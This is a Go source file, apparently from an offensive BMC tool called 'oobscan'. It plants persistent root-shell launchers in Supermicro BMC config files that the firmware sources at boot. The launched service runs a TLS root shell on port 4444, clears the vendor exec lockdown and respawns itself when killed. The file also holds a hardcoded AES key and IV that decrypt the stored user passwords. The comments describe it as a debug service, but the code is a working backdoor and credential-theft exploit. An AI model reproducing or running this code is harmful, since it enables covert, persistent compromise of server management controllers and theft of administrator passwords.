// ParseSMCShellClientCert recovers a SMCShellClientCert from a combined PEM file
// (a CERTIFICATE block followed by a private key block), so a cached identity
// survives across runs instead of being regenerated - and re-pinned - each time.
func ParseSMCShellClientCert(data []byte) (*SMCShellClientCert, error) {
	var certPEM, keyPEM []byte
	rest := data
	for {
		var blk *pem.Block
		blk, rest = pem.Decode(rest)
		if blk == nil {
			break
		}
		switch blk.Type {
		case "CERTIFICATE":
			if certPEM == nil {
				certPEM = pem.EncodeToMemory(blk)
			}
		case "RSA PRIVATE KEY", "PRIVATE KEY":
			if keyPEM == nil {
				keyPEM = pem.EncodeToMemory(blk)
			}
		}
	}
	if certPEM == nil || keyPEM == nil {
		return nil, fmt.Errorf("not a valid client cert file: need both a CERTIFICATE and a private key block")
	}
	blk, _ := pem.Decode(certPEM)
	cert, err := x509.ParseCertificate(blk.Bytes)
	if err != nil {
		return nil, fmt.Errorf("parsing certificate: %w", err)
	}
	sum := sha256.Sum256(blk.Bytes)
	fp := make([]string, len(sum))
	for i, b := range sum {
		fp[i] = fmt.Sprintf("%02X", b)
	}
	return &SMCShellClientCert{
		CertPEM:     certPEM,
		KeyPEM:      keyPEM,
		Fingerprint: strings.Join(fp, ":"),
		CommonName:  cert.Subject.CommonName,
	}, nil
}

const (
	SMCShellSyslogConfName = "syslog.conf"
	// SMCShellNetconfigName is the fallback payload host for older X10 firmware,
	// whose restore copy list omits syslog.conf and whose service.conf is parsed
	// rather than sourced. /nv/network/netconfig0 is in that copy list and is
	// `source`d as root at boot by /etc/network/network6, which libipmi invokes to
	// apply the saved network config.
	SMCShellNetconfigName = "network/netconfig0"
	// SMCShellDDNSName is the payload host for X10 FW ~3.5x, whose restore copy
	// list omits both syslog.conf and network/netconfig0 and whose service.conf
	// is parsed rather than sourced. ddns/DDNS_CONFIG is in that copy list and is
	// `source`d as root by /sbin/ddns_update.sh (line: source "$basedir"/"DDNS_CONFIG")
	// BEFORE its enable check, so the payload runs even with DDNS disabled.
	// ddns_update.sh is reached at boot from ntp_service.sh (88service.sh) and
	// from LanConfigApply. See kb/smc/notes/x10-fw353-openssl-salted-config.md.
	SMCShellDDNSName = "ddns/DDNS_CONFIG"
	// SMCShellHostnameDHCPName identifies a retired Telnet launcher for cleanup.
	SMCShellHostnameDHCPName = "hostname_for_dhcp"
	// SMCShellServiceConfName is the local-artifact filename recording the
	// generated service script for the operator. The service is no longer shipped
	// to /nv as a separate file: the restore copy list differs by generation and
	// the X10 allowlist admits syslog.conf but not an extra *.conf, so a
	// second-file payload silently never landed there. It is embedded in
	// syslog.conf instead -- see BuildSMCShellSyslogConf.
	SMCShellServiceConfName = "dbgsvc.conf"

	// SMCShellServiceName is the live /nv/service.conf member: KEY=VALUE service
	// toggles (HTTP_SERVICE, SSH_SERVICE, ...) that /etc/scripts/service `source`s
	// at boot on X9/X10/X11/H13. On X9 FW 3.5x/3.62 it is UNSOURCED-hardened (a
	// plain `source $SERVICE_CONF`), so appended shell executes; on X10 3.93/4.00
	// it is hardened to a `while read` KEY=VALUE export loop, so appended shell is
	// inert. It is in every generation's restore copy-list (cp_files) and is
	// `source`d by 6 init scripts (stunneld/ikvmd/vmd/httpd/smashd/openwsmand)
	// unconditionally from rcS. This is the reliable X9 delivery vector where the
	// hostname_for_dhcp DHCP-event trigger does not fire.
	SMCShellServiceName = "service.conf"

	// smcShellLauncherMarker delimits our appended launcher block in
	// syslog.conf so a re-deploy can strip and rewrite it idempotently.
	smcShellLauncherMarker = "# --- oobscan smc-restore-shell: persistent debug access service ---"
	// smcShellLegacyLauncherMarker is the pre-hyphen marker emitted by early
	// smcrestore-shell builds. It delimits the same block; strips must match
	// both so a board carrying an old deploy does not stack two supervisors.
	smcShellLegacyLauncherMarker = "# --- oobscan smcrestore-shell: persistent debug access service ---"

	// smcShellTmpServicePath is where the embedded service is written on tmpfs at
	// boot. smcShellServiceHeredoc is the here-doc delimiter, which must stay
	// quoted so the sourcing shell neither expands the service's own $vars nor
	// consumes its inner here-docs (OOB_CA_EOF / OOB_CONF_EOF); it is distinct
	// from both.
	smcShellTmpServicePath = "/tmp/oob-dbgsvc.sh"
	smcShellServiceHeredoc = "OOB_DBGSVC_PAYLOAD_EOF"
)

// smcShellLauncherIndex returns the offset of the first smc-restore-shell
// launcher block (current hyphen marker or the legacy pre-hyphen marker) so
// both re-deploy idempotency and uninstall strips match old and new deploys.
func smcShellLauncherIndex(current []byte) int {
	i := bytes.Index(current, []byte(smcShellLauncherMarker))
	legacy := bytes.Index(current, []byte(smcShellLegacyLauncherMarker))
	if i < 0 || (legacy >= 0 && legacy < i) {
		return legacy
	}
	return i
}

// BuildSMCShellSyslogConf appends a self-contained, backgrounded launcher to the
// unit's current /nv/syslog.conf, embedding the service script so it is written to
// tmpfs at boot and run from there. syslog.conf is the one config member every
// generation's restore copy list includes and that /etc/init.d/slogd `source`s as
// root. The append preserves the syslogd variables the init script needs, and the
// service is backgrounded because slogd is sourced synchronously from 88service.sh
// before proc_mgr starts -- a blocking payload would stall boot.
func BuildSMCShellSyslogConf(current, service []byte) []byte {
	// Idempotent: if a previous launcher block is present (re-deploy), strip it
	// and everything after so we do not stack duplicate launchers.
	if i := smcShellLauncherIndex(current); i >= 0 {
		current = bytes.TrimRight(current[:i], "\n")
		current = append(current, '\n')
	}
	var b bytes.Buffer
	b.Write(current)
	if len(current) > 0 && current[len(current)-1] != '\n' {
		b.WriteByte('\n')
	}
	b.WriteString("\n" + smcShellLauncherMarker + `
# MUST stay non-blocking: /etc/init.d/slogd is sourced synchronously from
# /etc/init.d/88service.sh (which rcS sources) BEFORE proc_mgr starts, so the
# service is backgrounded or the boot would hang. It is embedded here (written to
# tmpfs at boot) rather than shipped as a second /nv file, because the X10 4.00
# config-restore copy list does not include an extra *.conf; syslog.conf is
# copied and sourced as root on every generation.
cat > ` + smcShellTmpServicePath + " <<'" + smcShellServiceHeredoc + "'\n")
	b.Write(service)
	if len(service) == 0 || service[len(service)-1] != '\n' {
		b.WriteByte('\n')
	}
	b.WriteString(smcShellServiceHeredoc + "\n/bin/sh " + smcShellTmpServicePath + " </dev/null >/dev/null 2>&1 &\n")
	return b.Bytes()
}

// BuildSMCShellNetconfig appends the launcher to /nv/network/netconfig0 for older
// X10 firmware where syslog.conf is not restored and service.conf is parsed rather
// than sourced. netconfig0 is the one member that is both restored and `source`d
// as root at boot (by network6, invoked by libipmi). Append-only: the original
// network variables are preserved verbatim, and the appended block is a
// backgrounded subshell -- `( ... ) &` -- because network6 keeps configuring the
// interface after sourcing and nothing here may abort it.
func BuildSMCShellNetconfig(current, service []byte) []byte {
	// Idempotent re-deploy: strip any prior launcher block and everything after.
	if i := smcShellLauncherIndex(current); i >= 0 {
		current = bytes.TrimRight(current[:i], "\n")
		current = append(current, '\n')
	}
	var b bytes.Buffer
	b.Write(current)
	if len(current) > 0 && current[len(current)-1] != '\n' {
		b.WriteByte('\n')
	}
	// The whole block is one backgrounded subshell. network6 sources this file and
	// then reads $INTERFACE0/$DEVICE0/... which are set above; our block sets no
	// such variable and returns control immediately.
	b.WriteString("\n" + smcShellLauncherMarker + `
# Sourced by /etc/network/network6 (a symlink target of /nv/network/netconfig0),
# which libipmi runs at boot to bring up the interface. network6 continues
# configuring the NIC after this point, so the launcher is a single backgrounded
# subshell: it must not block, and must not exit the sourcing shell. The service
# is written to tmpfs and detaches under setsid on its own.
( cat > ` + smcShellTmpServicePath + " <<'" + smcShellServiceHeredoc + "'\n")
	b.Write(service)
	if len(service) == 0 || service[len(service)-1] != '\n' {
		b.WriteByte('\n')
	}
	b.WriteString(smcShellServiceHeredoc + "\n/bin/sh " + smcShellTmpServicePath + " </dev/null >/dev/null 2>&1 ) </dev/null >/dev/null 2>&1 &\n")
	return b.Bytes()
}

// BuildSMCShellDDNSConf appends the launcher to /nv/ddns/DDNS_CONFIG for X10
// FW ~3.5x, where neither syslog.conf nor netconfig0 is restored and service.conf
// is parsed rather than sourced. DDNS_CONFIG is `source`d as root by ddns_update.sh
// before its enable check, so the original enable=/keyname=/dns_server= variables
// are preserved verbatim and the appended block is a single backgrounded subshell
// that cannot block or exit the sourcing script.
func BuildSMCShellDDNSConf(current, service []byte) []byte {
	// Idempotent re-deploy: strip any prior launcher block and everything after.
	if i := smcShellLauncherIndex(current); i >= 0 {
		current = bytes.TrimRight(current[:i], "\n")
		current = append(current, '\n')
	}
	var b bytes.Buffer
	b.Write(current)
	if len(current) > 0 && current[len(current)-1] != '\n' {
		b.WriteByte('\n')
	}
	// One backgrounded subshell: ddns_update.sh sources this file and then reads
	// $enable/$keyname/$dns_server, which are set above; our block sets no such
	// variable and returns control immediately.
	b.WriteString("\n" + smcShellLauncherMarker + `
# Sourced by /sbin/ddns_update.sh (via /usr/local/etc/ddns/DDNS_CONFIG, a symlink
# to /nv/ddns/DDNS_CONFIG) BEFORE its DDNS-enable check, so this runs even with
# DDNS disabled. ddns_update.sh continues after this point, so the launcher is a
# single backgrounded subshell: it must not block, and must not exit the sourcing
# shell. The service is written to tmpfs and detaches under setsid on its own.
( cat > ` + smcShellTmpServicePath + " <<'" + smcShellServiceHeredoc + "'\n")
	b.Write(service)
	if len(service) == 0 || service[len(service)-1] != '\n' {
		b.WriteByte('\n')
	}
	b.WriteString(smcShellServiceHeredoc + "\n/bin/sh " + smcShellTmpServicePath + " </dev/null >/dev/null 2>&1 ) </dev/null >/dev/null 2>&1 &\n")
	return b.Bytes()
}

// BuildSMCShellServiceConf renders the supervised stunnel launcher script that is
// sourced from syslog.conf. It reuses the on-box stunnel + cert (falling back to
// server.pem), pins the client certificate, and re-launches stunnel if the
// vendor's stunneld kills it. Numeric `verify = 4` and lowercase `execargs` are
// used because both stunnel 4.x and 5.x accept them.
func BuildSMCShellServiceConf(svc SMCShellService) []byte {
	port := svc.Port
	if port <= 0 {
		port = 4444
	}
	delay := svc.StartDelaySec
	if delay <= 0 {
		delay = 20
	}
	clientPEM := strings.TrimRight(string(svc.CACertPEM), "\n")

	var b strings.Builder
	fmt.Fprintf(&b, `#!/bin/sh
# oobscan smc-restore-shell: supervised, cert-authenticated root shell service.
#
# Embedded in /nv/%s by the ATEN config-restore file-placement primitive, written
# to %s at boot and run (backgrounded) from there by /etc/init.d/slogd. Provides a
# TLS root shell on tcp/%d, authenticated by the single pinned client certificate
# below. Uses only binaries already on the BMC and writes only to tmpfs, so the
# sole persistent artifact is the launcher block in /nv/syslog.conf.
#
# Remove by stripping the launcher block from /nv/syslog.conf and rebooting (which
# clears the tmpfs copy), or by killing the supervisor + stunnel.

DBG_PORT=%d
DBG_DELAY=${DBG_DELAY:-%d}
CONF=/tmp/oob-dbgsvc.conf
CAF=/tmp/oob-dbgsvc-ca.pem
EXEC=/tmp/oob-dbgsvc-shell.sh
GUARD=/tmp/oob-dbgsvc.running
LOG=/dev/null

log() { echo "[oob-dbgsvc $(date '+%%H:%%M:%%S')] $*" >> "$LOG"; }
log "=== start pid=$$ $(grep '^Uid:' /proc/self/status 2>/dev/null) ==="

# Detach into our own session so a slogd restart (or anything that signals the
# original process group) does not take the supervisor down with it, and so the
# synchronous slogd sourcing is not blocked. Re-exec once under setsid, marking
# the child with OOB_SETSID so it does not recurse. The parent never touches the
# lock; only the detached child below acquires it.
if [ -z "$OOB_SETSID" ] && command -v setsid >/dev/null 2>&1 ; then
    OOB_SETSID=1 ; export OOB_SETSID
    exec setsid /bin/sh "$0" </dev/null >/dev/null 2>&1 &
    exit 0
fi

# Atomic single-instance lock. syslog.conf is re-sourced back-to-back at boot
# (multiple init scripts) and on every settings change, so a test-then-write
# pidfile would admit every invocation before any of them writes and they would
# all bind the same port. mkdir is atomic on tmpfs/jffs2; exactly one child wins
# and holds the lock for the lifetime of its supervisor loop. A stale dir (holder
# killed without cleanup) is reclaimed via pid liveness.
if ! mkdir "$GUARD" 2>/dev/null ; then
    _p=$(cat "$GUARD/pid" 2>/dev/null)
    if [ -n "$_p" ] && kill -0 "$_p" 2>/dev/null ; then
        log "supervisor already running (pid $_p), exiting"
        exit 0
    fi
    rm -rf "$GUARD" 2>/dev/null
    if ! mkdir "$GUARD" 2>/dev/null ; then
        log "lock busy; exiting"
        exit 0
    fi
fi
echo $$ > "$GUARD/pid"
trap 'rm -rf "$GUARD" 2>/dev/null' EXIT

# Least-preferred OOM victim: this is the only way back in if the box is sick,
# which is exactly when the OOM killer is active.
sh -c 'echo -1000 > /proc/self/oom_score_adj' 2>/dev/null

# Backgrounded by the caller, so this sleep does not stall boot.
sleep "$DBG_DELAY"

# Clear the SMCI exec/file-open lockdown when this generation has it (X12,
# X13DAI ship chk_exec.ko + pooh.ko; both hooks read one flag and allow
# everything when it is not 1). Absent on X10/X11/H13, where the writes simply
# find no such path and are skipped. Each write goes through its own "sh -c"
# so a missing proc entry or a refused write fails inside a throwaway child
# instead of tearing down the supervisor's own shell. Re-applied every
# supervisor iteration in case the vendor TEE service re-arms them.
unlock_exec() {
    if [ -w /proc/check/chkexec ] ; then
        sh -c 'echo 0 > /proc/check/chkexec' 2>/dev/null && log "cleared /proc/check/chkexec"
    fi
    if [ -w /proc/filechk/filechk_tee ] ; then
        sh -c 'echo 0 > /proc/filechk/filechk_tee' 2>/dev/null && log "cleared /proc/filechk/filechk_tee"
    fi
}

# Runtime files live on tmpfs and are rewritten before every stunnel start, so
# a /tmp cleaner or a partial boot cannot leave the service permanently broken.
write_runtime_files() {
    CERT=/nv/stunnel.crt
    KEY=/nv/stunnel.key
    if [ ! -f "$CERT" ] || [ ! -f "$KEY" ] ; then
        CERT=/nv/server.pem
        KEY=/nv/server.pem
    fi
    if [ ! -f "$CERT" ] ; then
        CERT=/etc/stunnel/server.crt
        KEY=/etc/stunnel/server.key
    fi

    cat > "$CAF" <<'OOB_CA_EOF'
%s
OOB_CA_EOF

	cat > "$EXEC" <<'OOB_SHELL_EOF'
#!/bin/sh
exec /bin/sh 2>&1
OOB_SHELL_EOF
	chmod 700 "$EXEC"

    cat > "$CONF" <<OOB_CONF_EOF
; oobscan smc-restore-shell debug service
foreground = yes
pid = /tmp/oob-dbgsvc-stunnel.pid
syslog = no
debug = 0

[dbg]
accept = $DBG_PORT
cert = $CERT
key = $KEY
CAfile = $CAF
verify = 4
exec = /bin/sh
execargs = sh $EXEC
pty = yes
OOB_CONF_EOF
}

# Supervise: stunnel is foreground, so it only returns on failure or when the
# vendor stunneld runs 'killall -9 stunnel'. A burst of fast exits backs off
# rather than giving up for good - an early failure (port still held by a
# dying stunnel, /nv not mounted yet) must not cost the whole uptime, and the
# only way back in after a permanent give-up is another config-restore reboot.
fast=0
n=0
while [ "$n" -lt 100000 ] ; do
    n=$((n + 1))
    unlock_exec
    write_runtime_files
    t0=$(date '+%%s')
    /bin/stunnel "$CONF" >> "$LOG" 2>&1
    log "stunnel exited rc=$? (run #$n)"
    t1=$(date '+%%s')
    if [ $((t1 - t0)) -lt 5 ] ; then
        fast=$((fast + 1))
    else
        fast=0
    fi
    if [ "$fast" -ge 5 ] ; then
		log "$fast fast failures; backing off 300s"
        sleep 300
        fast=0
    else
        sleep 5
    fi
done
rm -rf "$GUARD"
log "=== supervisor exiting after $n runs ==="
`, SMCShellSyslogConfName, smcShellTmpServicePath, port, port, delay, clientPEM)
	return []byte(b.String())
}

// ---- small helpers ----

// smcCCName names the IPMI completion codes the FileTransactions handlers
// return, for readable errors.
func smcCCName(cc byte) string {
	switch cc {
	case 0x00:
		return "ok"
	case 0x80:
		return "priv-level-not-available"
	case 0xC0:
		return "node-busy"
	case 0xC5:
		return "reservation-cancelled/stale-id"
	case 0xC7:
		return "req-data-length-invalid"
	case 0xCC:
		return "invalid-data-field/offset-out-of-range"
	case 0xD4:
		return "insufficient-privilege/lockdown"
	case 0xD5:
		return "not-supported-in-present-state"
	default:
		return "unknown"
	}
}

func appendLE16(b []byte, v uint16) []byte {
	return append(b, byte(v), byte(v>>8))
}

func appendLE32(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func sleepCtx(ctx context.Context, d time.Duration) error {
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-t.C:
		return nil
	}
}

// SMCStoredPassword is one account password recovered from an exported
// configuration.
type SMCStoredPassword struct {
	Offset     int
	Ciphertext string
	Plaintext  string
}

// SMCAtRestKey is the AES-256-CBC key and IV that protect every stored
// Supermicro user password at rest. They live in libipmi.so as raw bytes and
// are byte-identical across X10, X11, X12, X13 and H13, including the builds
// with a hardware root of trust. The login path compares in cleartext, so a
// recovered password is the password.
var (
	SMCAtRestKey = mustHex("a1cda0c87db4c61fa76dfb7dc3bfbe83808c823eabb76a2bc97c1617e8cd6676")
	SMCAtRestIV  = mustHex("2e7b4c71d0452a6b89b89af96ab3c6ca")
)

func mustHex(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		panic(err)
	}
	return b
}

// SMCRecoverPasswords pulls the password store out of a decrypted configuration
// archive and decrypts every record in it.
//
// Records are one AES block each, PKCS7 padded, and they are not aligned to the
// start of the store: on a live X11 export the factory blob sits at offset 0x7f.
// So every byte offset is tried and anything that decrypts to a short printable
// string is reported. That admits the occasional coincidence, which is why the
// ciphertext is reported alongside the plaintext.
func SMCRecoverPasswords(gz []byte) ([]SMCStoredPassword, error) {
	var store []byte
	gr, err := gzip.NewReader(bytes.NewReader(gz))
	if err != nil {
		return nil, err
	}
	defer gr.Close()
	tr := tar.NewReader(gr)
	for {
		h, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return nil, err
		}
		if strings.HasSuffix(h.Name, "PSBlock") && !strings.Contains(h.Name, "OEM") {
			if store, err = io.ReadAll(tr); err != nil {
				return nil, err
			}
		}
	}
	if store == nil {
		return nil, nil
	}
	return SMCDecryptPSBlock(store)
}

// SMCDecryptPSBlock decrypts the one-block password records in a raw PSBlock.
// It is shared by config-archive recovery and OEMHW1 arbitrary-file reads.
func SMCDecryptPSBlock(store []byte) ([]SMCStoredPassword, error) {
	block, err := aes.NewCipher(SMCAtRestKey)
	if err != nil {
		return nil, err
	}
	var out []SMCStoredPassword
	seen := map[string]bool{}
	for i := 0; i+aes.BlockSize <= len(store); i++ {
		ct := store[i : i+aes.BlockSize]
		if allSame(ct, 0x00) || allSame(ct, 0xff) || seen[string(ct)] {
			continue
		}
		seen[string(ct)] = true
		pt := make([]byte, aes.BlockSize)
		cipher.NewCBCDecrypter(block, SMCAtRestIV).CryptBlocks(pt, ct)
		pt = pkcs7Strip(pt)
		if len(pt) == 0 || len(pt) > 20 || !printableASCII(pt) {
			continue
		}
		out = append(out, SMCStoredPassword{
			Offset: i, Ciphertext: hex.EncodeToString(ct), Plaintext: string(pt),
		})
	}
	return out, nil
}

func allSame(b []byte, v byte) bool {
	for _, c := range b {
		if c != v {
			return false
		}
	}
	return true
}

func pkcs7Strip(b []byte) []byte {
	n := int(b[len(b)-1])
	if n < 1 || n > len(b) {
		return b
	}
	for _, c := range b[len(b)-n:] {
		if int(c) != n {
			return b
		}
	}
	return b[:len(b)-n]
}

func printableASCII(b []byte) bool {
	for _, c := range b {
		if c < 0x20 || c > 0x7e {
			return false
		}
	}
	return true
}
